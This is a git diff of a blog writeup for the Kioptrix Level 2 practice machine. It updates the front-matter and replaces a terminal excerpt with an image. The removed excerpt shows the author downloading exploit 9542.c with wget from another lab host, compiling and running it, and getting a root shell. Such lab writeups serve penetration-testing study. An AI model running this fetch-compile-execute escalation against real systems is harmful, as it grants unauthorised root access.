@@ -1,7 +1,7 @@
 ---
-title: "Kioptrix Lvl 1 Writeup"
+title: "Kioptrix Lvl 2 Writeup"
 layout: post
-date: 2017-05-04
+date: 2017-08-29
 image: /assets/images/markdown.jpg
 headerImage: false
 tag:
@@ -9,7 +9,7 @@ tag:
 - Pentest
 category: blog
 author: marioibarra
-description: Kioptrix lvl 1 Writeup
+description: Kioptrix lvl 2 Writeup
 ---
 
 ## Kioptrix Level 2
@@ -134,29 +134,7 @@ Copied to '/home/mario/oscp/exam/192.168.75.129/privesc/'
 
 
 
-<figure class="highlight"><pre><code class="nohighlight" data-lang="bash">bash-3.00$ wget http://192.168.75.135:8081/9542.c
---23:45:04--  http://192.168.75.135:8081/9542.c
-           => `9542.c'
-Connecting to 192.168.75.135:8081... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 2,645 (2.6K) [text/plain]
-
-    0K ..                                                    100%  360.35 MB/s
-
-23:45:04 (360.35 MB/s) - `9542.c' saved [2645/2645]
-
-bash-3.00$ ls
-1397
-1397.c
-9542.c
-LinEnum.sh
-linprivchecker.py
-bash-3.00$ gcc -o 9542 9542.c && ./9542  
-sh: no job control in this shell
-sh-3.00# whoami
-root
-sh-3.00# 
-</code></pre></figure>
+![image](/asset/images/kioptrixlvl2/kernel-exploit.png)
 
 
 It wasn't too bad getting root, but I did spend alot of time trying to use other exploits that weren't on the kernel.
